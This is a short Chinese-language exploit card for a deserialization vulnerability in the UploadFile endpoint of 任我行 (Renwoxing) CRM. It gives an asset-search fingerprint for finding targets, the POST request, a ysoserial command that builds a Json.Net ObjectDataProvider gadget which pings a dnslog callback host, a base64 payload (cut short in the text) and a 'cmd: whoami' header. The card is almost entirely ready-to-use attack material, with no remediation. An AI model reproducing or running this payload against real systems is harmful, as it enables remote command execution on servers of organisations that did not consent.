# 任我行协同CRMUploadFile存在反序列化漏洞

- **系统**：任我行协同　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app.name="任我行 CRM"`
- **请求**：`POST /SystemManage/UploadFile HTTP/1.1`

**请求体 / payload**
```
1.获取的dnslog地址替换，使用ysoserial.exe生成poc
ysoserial.exe -f Json.Net -g ObjectDataProvider -o base64 -c "ping ae5wpb.dnslog.cn" -t
1. 使用yakit，替换相应poc
Host:
Content-Type: application/x-www-form-urlencoded
Content-Length: 8
cmd: whoami
photoInfo={{base64dec(ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25GcmFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICAgJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcn…（脚本共 957 字，完整版见原文）
```
- **预期**：200　|　DNSLOG回显

**其他**
- 语法: app.name="任我行 CRM"
app="任我行-CRM"